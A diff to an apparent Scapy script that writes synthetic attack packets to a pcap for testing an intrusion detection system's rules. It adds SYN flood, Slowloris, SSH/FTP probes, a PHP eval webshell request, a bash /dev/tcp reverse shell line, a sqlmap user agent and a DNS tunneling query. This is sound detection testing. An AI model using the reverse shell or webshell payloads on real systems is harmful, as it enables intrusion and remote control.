@@ -68,7 +68,6 @@ xss_event = (
 packets.append(xss_event)
 
 # 3. PATH TRAVERSAL / LFI
-
 # SID:1000020 - ../
 path_traversal = (
     IP(src="192.168.1.102", dst="10.0.0.5")
@@ -133,7 +132,95 @@ synfin = (
 )
 packets.append(synfin)
 
-# 6. NORMAL TRAFFIC 
+# 6. DENIAL OF SERVICE (DOS)
+
+# SID:1000201 - SYN Flood (detection_filter: > 10 SYN toi cung dich trong 1 giay)
+for i in range(12):
+    syn_flood = (
+        IP(src="192.168.1.210", dst="10.0.0.5")
+        / TCP(sport=33445 + i, dport=80, flags="S", seq=1)
+    )
+    packets.append(syn_flood)
+
+# SID:1000202 - Slowloris HTTP header probe
+slowloris = (
+    IP(src="192.168.1.211", dst="10.0.0.5")
+    / TCP(sport=33446, dport=80, flags="PA", seq=1, ack=1)
+    / Raw(load=b"GET / HTTP/1.1\r\nHost: victim.com\r\nX-a: b\r\n\r\n")
+)
+packets.append(slowloris)
+
+# SID:1000203 - Large ICMP echo request (dsize > 800)
+icmp_pod = (
+    IP(src="192.168.1.212", dst="10.0.0.5")
+    / ICMP(type=8, code=0)
+    / Raw(load=b"A" * 1000)
+)
+packets.append(icmp_pod)
+
+# 7. BRUTE FORCE & CREDENTIAL ATTACKS
+
+# SID:1000301 - SSH probe
+ssh_probe = (
+    IP(src="192.168.1.220", dst="10.0.0.5")
+    / TCP(sport=44551, dport=22, flags="PA", seq=1, ack=1)
+    / Raw(load=b"SSH-2.0-OpenSSH_8.9\r\n")
+)
+packets.append(ssh_probe)
+
+# SID:1000302 - FTP anonymous
+ftp_probe = (
+    IP(src="192.168.1.221", dst="10.0.0.5")
+    / TCP(sport=44552, dport=21, flags="PA", seq=1, ack=1)
+    / Raw(load=b"USER anonymous\r\n")
+)
+packets.append(ftp_probe)
+
+# 8. MALWARE & C2 ACTIVITY
+
+# SID:1000401 - PHP Webshell
+webshell = (
+    IP(src="192.168.1.230", dst="10.0.0.5")
+    / TCP(sport=55661, dport=80, flags="PA", seq=1, ack=1)
+    / Raw(load=b"POST /shell.php HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 46\r\n\r\n<?php eval(base64_decode('cGhwaW5mbygpOw==')); ?>")
+)
+packets.append(webshell)
+
+# SID:1000402 - Reverse shell
+rev_shell = (
+    IP(src="192.168.1.231", dst="10.0.0.5")
+    / TCP(sport=4444, dport=4444, flags="PA", seq=1, ack=1)
+    / Raw(load=b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+)
+packets.append(rev_shell)
+
+# SID:1000404 - SQLMap User-Agent
+sqlmap_ua = (
+    IP(src="192.168.1.232", dst="10.0.0.5")
+    / TCP(sport=55662, dport=80, flags="PA", seq=1, ack=1)
+    / Raw(load=b"GET / HTTP/1.1\r\nHost: victim.com\r\nUser-Agent: sqlmap/1.7#stable\r\n\r\n")
+)
+packets.append(sqlmap_ua)
+
+# 9. RECONNAISSANCE (UDP & ICMP)
+
+# SID:1000501 - SNMP public community probe
+snmp_probe = (
+    IP(src="192.168.1.240", dst="10.0.0.5")
+    / UDP(sport=60111, dport=161)
+    / Raw(load=b"\x30\x29\x02\x01\x01\x04\x06public\xa0")
+)
+packets.append(snmp_probe)
+
+# SID:1000502 - DNS Tunneling query
+dns_tunnel = (
+    IP(src="192.168.1.241", dst="10.0.0.5")
+    / UDP(sport=60112, dport=53)
+    / Raw(load=b"\x00\x01\x01\x00\x00\x01\x07exfil01\x08c2tunnel\x02io\x00")
+)
+packets.append(dns_tunnel)
+
+# 10. NORMAL TRAFFIC 
 
 # HTTP GET bình thường
 normal_http = (
@@ -171,6 +258,10 @@ wrpcap(OUTPUT_FILE, packets)
 print(f"[OK] Da tao {len(packets)} goi tin vao {OUTPUT_FILE}")
 print(f"   - 10 goi tan cong web (SQLi, XSS, Path Traversal, CMD Injection)")
 print(f"   -  4 goi network scan (Xmas, Null, FIN, SYN-FIN)")
+print(f"   - 14 goi DoS (12 SYN Flood, Slowloris, ICMP Oversized)")
+print(f"   -  2 goi Brute-force (SSH probe, FTP anonymous)")
+print(f"   -  3 goi Malware/C2 (Webshell, Reverse shell, Sqlmap User-Agent)")
+print(f"   -  2 goi UDP/ICMP Recon (SNMP public, DNS tunneling)")
 print(f"   -  4 goi traffic binh thuong (HTTP, DNS, ICMP, SYN)")
 print(f"\n[INFO] De chay NIDS phan tich file nay:")
 print(f"   python main.py")
